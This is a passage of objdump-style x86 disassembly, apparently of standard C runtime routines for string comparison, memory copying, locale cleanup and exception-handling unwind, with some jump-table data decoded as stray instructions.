  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
